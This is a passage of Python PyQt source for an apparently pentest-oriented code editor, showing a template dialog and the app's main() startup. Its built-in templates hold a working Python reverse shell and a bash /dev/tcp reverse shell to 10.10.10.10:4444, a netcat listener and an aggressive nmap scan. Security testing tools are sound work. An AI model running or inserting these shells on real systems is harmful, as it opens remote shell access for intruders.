            custom_label = QLabel("CUSTOM TEMPLATES")
            custom_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
            custom_label.setStyleSheet("color: #ff6600;")
            container_layout.addWidget(custom_label)
            
            for name, code in self.custom_templates.items():
                frame = QFrame()
                frame.setStyleSheet("background: #112200; border: 2px solid #ffaa00;")
                frame_layout = QVBoxLayout(frame)
                
                name_label = QLabel(name)
                name_label.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
                name_label.setStyleSheet("color: #ffaa00;")
                frame_layout.addWidget(name_label)
                
                insert_btn = QPushButton("INSERT INTO EDITOR")
                insert_btn.clicked.connect(lambda checked, c=code: self.insert_template(c))
                frame_layout.addWidget(insert_btn)
                
                container_layout.addWidget(frame)
        
        container_layout.addStretch()
        scroll.setWidget(container)
        layout.addWidget(scroll)
        
        self.setLayout(layout)
    
    def get_builtin_templates(self):
        """Return built-in templates"""
        return {
            "PYTHON REVERSE SHELL": '''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            
            "BASH REVERSE SHELL": '''bash -i >& /dev/tcp/10.10.10.10/4444 0>&1''',
            
            "NETCAT LISTENER": '''nc -lvnp 4444''',
            
            "NMAP AGGRESSIVE SCAN": '''nmap -A -T4 -p- 10.10.10.10'''
        }
    
    def insert_template(self, code):
        """Insert template into parent editor"""
        if self.parent_editor:
            self.parent_editor.editor.insertPlainText("\n" + code + "\n")
        self.close()

def main():
    # Set environment variables for HiDPI scaling BEFORE creating the application
    import os
    os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
    os.environ["QT_SCALE_FACTOR"] = "1"
    os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
    
    app = QApplication(sys.argv)
    
    # HiDPI handling
    try:
        app.setHighDpiScaleFactorRoundingPolicy(
            Qt.HighDpiScaleFactorRoundingPolicy.PassThrough
        )
        if hasattr(Qt.ApplicationAttribute, 'AA_EnableHighDpiScaling'):
            app.setAttribute(Qt.ApplicationAttribute.AA_EnableHighDpiScaling, True)
        if hasattr(Qt.ApplicationAttribute, 'AA_UseHighDpiPixmaps'):
            app.setAttribute(Qt.ApplicationAttribute.AA_UseHighDpiPixmaps, True)
    except AttributeError:
        print("Note: Using environment variables for HiDPI scaling")
    
    # Create and show window
    window = LeviathanEditUltimate()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()